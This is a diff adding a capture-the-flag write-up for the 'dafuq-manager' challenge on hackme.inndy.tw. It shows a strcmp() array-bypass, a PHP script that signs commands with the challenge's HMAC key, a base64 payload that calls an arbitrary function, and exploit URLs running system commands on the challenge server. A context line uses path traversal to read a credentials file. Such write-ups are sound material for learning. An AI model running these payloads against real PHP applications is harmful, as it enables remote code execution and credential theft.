@@ -50,6 +50,26 @@
   [cat flag](https://dafuq-manager.hackme.inndy.tw/index.php?action=edit&item=../../.config/.htusers.php)
   crack by rainbow table
 
+## 33 
+  1. set `action=debug`, `dir` is `dir[]` make `strcmp()` function return `0`
+  2. generate payload
+  ``` php
+    <?php
+    function make_command($cmd) {
+        $hmac = hash_hmac('sha256', $cmd, 'KHomg4WfVeJNj9q5HFcWr5kc8XzE4PyzB8brEw6pQQyzmIZuRBbwDU7UE6jYjPm3');
+        return sprintf('%s.%s', base64_encode($cmd), $hmac);
+    }
+    echo make_command($_GET['cmd']);
+    ?>
+  ```
+  3. payload `$_GET["a"]($_GET["cmd"]);`
+  to `JF9HRVRbImEiXSgkX0dFVFsiY21kIl0pOw==.e3b4d16fa8cb3014e81ba999ac1b516f5b54f7bcdbc39339571ec1a8add2c182`
+  4. 
+    - [step1](https://dafuq-manager.hackme.inndy.tw/index.php?action=debug&command=JF9HRVRbImEiXSgkX0dFVFsiY21kIl0pOw==.e3b4d16fa8cb3014e81ba999ac1b516f5b54f7bcdbc39339571ec1a8add2c182&dir[]=%22&a=system&cmd=ls)
+    - [step2](https://dafuq-manager.hackme.inndy.tw/index.php?action=debug&command=JF9HRVRbImEiXSgkX0dFVFsiY21kIl0pOw==.e3b4d16fa8cb3014e81ba999ac1b516f5b54f7bcdbc39339571ec1a8add2c182&dir[]=%22&a=system&cmd=ls%20flag3)
+    - [step3](https://dafuq-manager.hackme.inndy.tw/index.php?action=debug&command=JF9HRVRbImEiXSgkX0dFVFsiY21kIl0pOw==.e3b4d16fa8cb3014e81ba999ac1b516f5b54f7bcdbc39339571ec1a8add2c182&dir[]=%22&a=system&cmd=cat%20flag3/meow.c)
+    - [step4](https://dafuq-manager.hackme.inndy.tw/index.php?action=debug&command=JF9HRVRbImEiXSgkX0dFVFsiY21kIl0pOw==.e3b4d16fa8cb3014e81ba999ac1b516f5b54f7bcdbc39339571ec1a8add2c182&dir[]=%22&a=system&cmd=./flag3/meow%20flag3/flag3)
+
 ## 41 helloworld
   ```
     objdump -d helloworld | less
